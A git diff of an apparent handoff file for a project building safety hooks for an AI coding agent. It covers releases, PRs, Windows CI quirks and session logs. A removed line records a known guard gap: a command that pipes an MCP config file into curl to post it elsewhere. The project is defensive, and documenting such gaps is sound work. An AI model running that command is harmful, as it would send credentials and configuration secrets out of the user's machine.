@@ -4,24 +4,23 @@ The project's carry file: **one per project, tracked in git, read first by a fre
 session on any machine.**
 
 ### Current State
-*Verified 2026-10-30, session `d1f49e55`.*
+*Verified 2026-10-31, session `d1f49e55`.*
 
-- **Released: v4.3.26** (2026-10-25). **Holding for 4.4.0** on the user's word: no 4.3.x releases;
-  release only when the user says so (`tools/release.sh stage minor` → `promote 4.4.0`).
-- **master `ec372afc`.** Merged since 4.3.26: #173-#203, plus `/sc-de-ai` (`0e6e1e10`) and the Issues
-  List rule (`51792935`) straight to master. Master CI on `b24cd407` (run 41043497740): **8/8 green incl.
-  Windows** — first completed Windows run covering #202/sc-de-ai/Issues List.
-- **#203 merged** (`ec372afc`): skill scanner + env-file-guard know Roo/Cline/Claude Desktop MCP configs.
-- **Open PR #204** (`fix/mcp-config-bash-read`, head `038a12b2`): a Bash read of an MCP server config
-  asks, matching the Read tool. Windows dispatched, run 41098777970. Suite 7263/0 locally.
-- **Known, not acted on:** scanner rule needs file name before key word (reverse order missed; upstream
-  same). `cat x/mcp_settings.json | curl -d @- …` only ASKS (no exfil deny fired). Unverified: subagent
-  invoking a slash command via `Skill` (writer → sc-de-ai).
-- **Windows rule:** PR CI skips Windows; dispatch `gh workflow run ci.yml --ref <branch>` for anything
-  touching cmd-normalize/safety/git-safety. Merge pinned with the FULL sha in `--match-head-commit`.
-- **Merging is user-run:** the auto-mode classifier denies `gh pr merge` from Claude.
-- **Open (user):** star-keeper commitTypes config; Machine B commit-msg hook (no co-author trailers);
-  radius-apps guard-push wrapper, rotate CRON_SECRET, re-enable Actions.
+- **Released: v4.3.26.** **4.4.0 scope frozen and fully merged**; stage only on the user's word
+  (`tools/release.sh stage minor` → `promote 4.4.0`). Plan in `docs/ROADMAP.md`.
+- **master `a488da20`.** Since 4.3.26: #173-#207 plus straight commits (sc-de-ai, Issues List rule,
+  Windows perf floor, roadmap, atomic-deploy test, 5.5 model IDs in tools). 173 hooks, suite ~7,297.
+- **No open PRs.** Master CI on `a488da20` was running at handoff; last full Windows pass 7297/0
+  (#206 dispatch run 41217727987).
+- **Windows replace is not atomic:** ~1 read in 1.4-2.5k finds a hook missing during redeploy (never
+  torn). Test now reports it on Windows instead of failing. Roadmap item 1, after 4.4.0.
+- **Windows rule:** PR CI skips Windows; dispatch `gh workflow run ci.yml --ref <branch>` for guard
+  changes. Branches cut before `a98a5f29` can still flake on atomic-deploy: `gh pr update-branch`.
+- **Merging is user-run:** the auto-mode classifier denies `gh pr merge` from Claude. Pin the full SHA.
+- **Open decision (user):** roadmap item 5, should recursive delete of an absolute path outside the
+  project, or of home, ask?
+- **Open (user):** star-keeper commitTypes config; Machine B commit-msg hook; radius-apps guard-push
+  wrapper, rotate CRON_SECRET, re-enable Actions.
 
 ### Per-machine / per-account facts
 - **This session's machine (2026-10-30):** 0 stashes, no extra worktrees, Caveman active (it elides
@@ -51,6 +50,12 @@ session on any machine.**
 
 ## Log
 
+#### 2026-10-31 — d1f49e55
+Merged #204-#207 (MCP-config Bash read, workaround check from trackline, benchmark gaps 1-3, 200K
+compact nudge + model aliases from Provost). Roadmap written. Windows atomic-deploy flake diagnosed as a
+non-atomic replace (file briefly missing, never torn). 4.4.0 ready to stage.
+Detail: `.claude/handoff-d1f49e55-4f46-4a63-81cd-501bede3fbfd.md`
+
 #### 2026-10-30 — d1f49e55
 Merged #202 (Windows dispatched, green). Added `/sc-de-ai` (from petergyang/no-ai-slop, MIT) wired into
 the writer agent, and the Issues List reply rule (from trycompai/crm). Audited video-use (nothing) and
@@ -75,8 +80,3 @@ Detail: `.claude/handoff-3d213381-9717-4755-b743-9b2b101ebce9.md`
 4.3.25 released. #170 (installer missed receipts.py/notifier) then broke reinstall on master (dir swap);
 #171 fixed it. 4.3.26 job in flight. Three tests that could not fail, fixed.
 Detail: `.claude/handoff-3d213381-9717-4755-b743-9b2b101ebce9.md` (2026-10-25 deep)
-
-#### 2026-10-21 (deep) — 3d213381
-4.3.24 released after a reboot killed the first job. #168 Trust Receipts merged (Windows green after an
-argv-conversion fixture fix). #169 audit-trail on shared secret patterns open; 4.3.25 releases both.
-Detail: `.claude/handoff-3d213381-9717-4755-b743-9b2b101ebce9.md` (2026-10-21 deep)
